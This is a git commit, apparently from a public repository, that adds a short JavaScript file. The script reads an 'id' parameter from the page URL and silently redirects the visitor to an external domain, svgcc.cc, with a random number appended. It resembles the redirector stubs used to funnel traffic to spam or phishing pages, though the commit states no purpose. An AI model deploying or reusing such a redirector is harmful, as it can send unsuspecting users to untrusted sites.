3b4acc87c095d07f96ecc1b4b7202059d6453ff1
wrk3094 <tengrajwrk3094@163.com>
2024-05-20 00:02:31 +0800

    Add files via upload

---
+++ tz/tz.js
@@ -0,0 +1,18 @@
+function getURLParameter(name) {
+  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
+}
+function getRandomNumber(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+var randomNumber = getRandomNumber(1, 1000);
+
+function redirectToSubpage(id) {
+  window.location.href = "http://svgcc.cc/kb/?id=" + id + "&" + randomNumber;
+}
+
+var urlid = getURLParameter('id');
+if (urlid) {
+  console.log("URL parameter 'id' value:", urlid);
+  redirectToSubpage(urlid);
+}
